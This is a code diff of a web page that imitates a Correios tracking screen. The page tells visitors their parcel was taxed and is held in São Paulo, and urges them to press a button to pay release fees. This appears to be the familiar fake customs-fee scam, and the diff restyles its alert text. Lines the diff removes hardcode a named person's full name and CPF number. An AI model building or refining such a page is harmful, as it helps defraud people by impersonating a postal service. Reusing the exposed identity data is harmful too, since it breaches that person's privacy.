@@ -223,11 +223,10 @@
 
     /* Pagamento */
     #pagamento {
-      background: #f0f0f0;
+      background: #ffffff;
       border-radius: 8px;
       padding: 2rem;
       font-family: Arial, sans-serif;
-      color: #003157;
       box-shadow: 0 0 10px rgb(0 0 0 / 0.1);
       text-align: center;
       max-width: 700px;
@@ -238,7 +237,6 @@
     #resultado h2, #pagamento h2 {
       font-weight: 700;
       margin-bottom: 1rem;
-      color: #003157;
       font-size: 14px;
     }
 
@@ -250,6 +248,30 @@
     #resultado p span, #pagamento p span {
       font-weight: 700;
       color: #007bff;
+    }
+
+    /* Alert styles */
+    .alert-title {
+      color: #dc3545;
+      font-weight: bold;
+      font-size: 18px;
+      margin-bottom: 15px;
+    }
+    
+    .status-label {
+      color: #003157;
+      font-weight: bold;
+      margin-bottom: 5px;
+    }
+    
+    .status-value {
+      color: #ffc107;
+      font-weight: bold;
+    }
+    
+    .normal-text {
+      color: #000000;
+      margin: 15px 0;
     }
 
     /* Rua e Bairro vazios */
@@ -355,62 +377,6 @@
       padding: 0 5px;
       color: #6c757d;
     }
-    
-    /* Status alert */
-    .status-alert {
-      display: flex;
-      align-items: center;
-      background-color: #fff3cd;
-      color: #856404;
-      padding: 10px 15px;
-      border-radius: 4px;
-      margin: 15px 0;
-      font-weight: bold;
-    }
-    
-    .status-alert:before {
-      content: "•";
-      color: #ffc107;
-      font-size: 24px;
-      margin-right: 10px;
-    }
-    
-    .status-label {
-      color: #003157;
-      font-weight: bold;
-      margin-right: 5px;
-    }
-    
-    /* Warning icon */
-    .warning-icon {
-      color: #dc3545;
-      margin-right: 5px;
-    }
-    
-    /* Info overlay */
-    .info-overlay {
-      background-color: #f8f9fa;
-      border: 1px solid #dee2e6;
-      border-radius: 4px;
-      padding: 15px;
-      margin: 20px 0;
-      text-align: left;
-    }
-    
-    .info-row {
-      display: flex;
-      justify-content: space-between;
-      margin-bottom: 10px;
-    }
-    
-    .info-label {
-      font-weight: bold;
-      color: #003157;
-    }
-    
-    .info-value {
-      color: #212529;
-    }
   </style>
 </head>
 
@@ -493,40 +459,19 @@
         <li class="active">Rastreamento</li>
       </ul>
       
-      <div class="status-alert">
-        <span class="status-label">STATUS DA ENTREGA:</span> AGUARDANDO SUA CONFIRMAÇÃO
-      </div>
+      <div class="alert-title">❗ SUA ENCOMENDA FOI TRIBUTADA!</div>
       
-      <h2><span class="warning-icon">❗</span> SUA ENCOMENDA FOI TRIBUTADA!</h2>
+      <div class="status-label">STATUS DA ENTREGA:</div>
+      <div class="status-value">AGUARDANDO SUA CONFIRMAÇÃO</div>
       
-      <p style="color: #000;">Sua encomenda está retida na agência dos Correios em São Paulo</p>
+      <p class="normal-text">Sua encomenda está retida na agência dos Correios em São Paulo</p>
       
-      <p style="color: #000;">Para prosseguir com o processo de liberação e entrega da sua encomenda, é necessário efetuar o pagamento das taxas aplicáveis. Por favor, utilize o botão abaixo para realizar o procedimento de forma segura:</p>
-      
-      <div class="info-overlay">
-        <div class="info-row">
-          <span class="info-label">NOME:</span>
-          <span class="info-value" id="pag-nome">Rosiane O Silva</span>
-        </div>
-        <div class="info-row">
-          <span class="info-label">CPF:</span>
-          <span class="info-value" id="pag-cpf">118.273.047-74</span>
-        </div>
-        <div class="info-row">
-          <span class="info-label">CIDADE:</span>
-          <span class="info-value" id="pag-cidade">Porciúncula</span>
-        </div>
-      </div>
-      
-      <div class="status-alert">
-        <span class="status-label">Previsão de Entrega:</span> 3 dias após o pagamento
-      </div>
-      
-      <p>Objeto aguardando sua confirmação</p>
-      <p>em Unidade de Fiscalização em São Paulo</p>
+      <p class="normal-text">Para prosseguir com o processo de liberação e entrega da sua encomenda, é necessário efetuar o pagamento das taxas aplicáveis. Por favor, utilize o botão abaixo para realizar o procedimento de forma segura:</p>
       
       <div class="btn-container">
         <button id="btn-pagar">Efetuar Pagamento</button>
+        <p>Objeto aguardando sua confirmação</p>
+        <p>em Unidade de Fiscalização em São Paulo</p>
         <p>Objeto em transferência - por favor aguarde</p>
         <p>Objeto Postado</p>
         <a href="#" id="voltar-rastreio">Voltar ao rastreamento</a>
@@ -670,11 +615,6 @@
 
         document.getElementById("res-cidade").textContent = dadosPessoa.cidade;
         document.getElementById("res-estado").textContent = dadosPessoa.estado;
-
-        // Atualiza também os dados na tela de pagamento
-        document.getElementById("pag-nome").textContent = "Rosiane O Silva";
-        document.getElementById("pag-cpf").textContent = "118.273.047-74";
-        document.getElementById("pag-cidade").textContent = dadosPessoa.cidade;
 
         document.getElementById("loading-container").style.display = "none";
         document.getElementById("tela-formulario").style.display = "none";
